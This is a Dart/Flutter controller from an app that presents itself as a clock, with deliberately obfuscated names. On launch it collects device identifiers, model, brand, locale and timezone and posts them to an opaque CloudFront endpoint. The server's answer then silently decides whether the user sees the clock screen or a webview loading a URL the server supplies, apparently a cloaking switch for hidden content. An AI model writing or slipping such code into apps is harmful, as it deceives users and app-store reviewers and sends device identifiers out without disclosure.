import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class RulerInitLogic extends GetxController {

  var xiufdvqrb = RxBool(false);
  var lfavin = RxBool(true);
  var qcpf = RxString("");
  var hvpo = RxBool(false);
  var iergd = RxBool(true);
  final ngcevyxub = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    ctnoufw();
  }


  Future<void> ctnoufw() async {
    hvpo.value = true;
    iergd.value = true;
    lfavin.value = false;

    ngcevyxub.post("https://d1yn5x4jeu1e50.cloudfront.net/wblmaxjtdgpvzykuecniqrfhos?no_check",data: await qbpkgc()).then((value) {
      var gkoabhzx = value.data["gkoabhzx"] as String;
      var arzsxlk = value.data["arzsxlk"] as bool;
      if (arzsxlk) {
        qcpf.value = gkoabhzx;
        ceas();
      } else {
        lhrqjzsy();
      }
    }).catchError((e) {
      lfavin.value = true;
      iergd.value = true;
      hvpo.value = false;
    });
  }

  Future<Map<String, dynamic>> qbpkgc() async {
    final DeviceInfoPlugin ykgqizjn = DeviceInfoPlugin();
    PackageInfo mtgkbl_cxybpwq = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var ulwiejp = Platform.localeName;
    var vphfw = currentTimeZone;

    var jhkzq = mtgkbl_cxybpwq.packageName;
    var gyspil = mtgkbl_cxybpwq.version;
    var pjgktm = mtgkbl_cxybpwq.buildNumber;

    var klso = mtgkbl_cxybpwq.appName;
    var dtmhcz = "";
    var gmieduc  = "";
    var qyvfnh = "";
    var klmbxdn = "";
    var jvqxfehi = "";
    var oxcrbd = "";


    var pstlrxd = "";
    var feabjdsv = false;

    if (GetPlatform.isAndroid) {
      pstlrxd = "android";
      var azvigbncoe = await ykgqizjn.androidInfo;

      qyvfnh = azvigbncoe.brand;

      dtmhcz  = azvigbncoe.model;
      gmieduc = azvigbncoe.id;

      feabjdsv = azvigbncoe.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      pstlrxd = "ios";
      var qldnscpj = await ykgqizjn.iosInfo;
      qyvfnh = qldnscpj.name;
      dtmhcz = qldnscpj.model;

      gmieduc = qldnscpj.identifierForVendor ?? "";
      feabjdsv  = qldnscpj.isPhysicalDevice;
    }

    var res = {
      "klso": klso,
      "pjgktm": pjgktm,
      "gyspil": gyspil,
      "jhkzq": jhkzq,
      "dtmhcz": dtmhcz,
      "vphfw": vphfw,
      "qyvfnh": qyvfnh,
      "gmieduc": gmieduc,
      "ulwiejp": ulwiejp,
      "pstlrxd": pstlrxd,
      "feabjdsv": feabjdsv,
      "klmbxdn" : klmbxdn,
      "jvqxfehi" : jvqxfehi,
      "oxcrbd" : oxcrbd,

    };
    return res;
  }

  Future<void> lhrqjzsy() async {
    Get.offNamed("/ClockMainPage");
  }

  Future<void> ceas() async {
    Get.offNamed("/Outreload");
  }

}
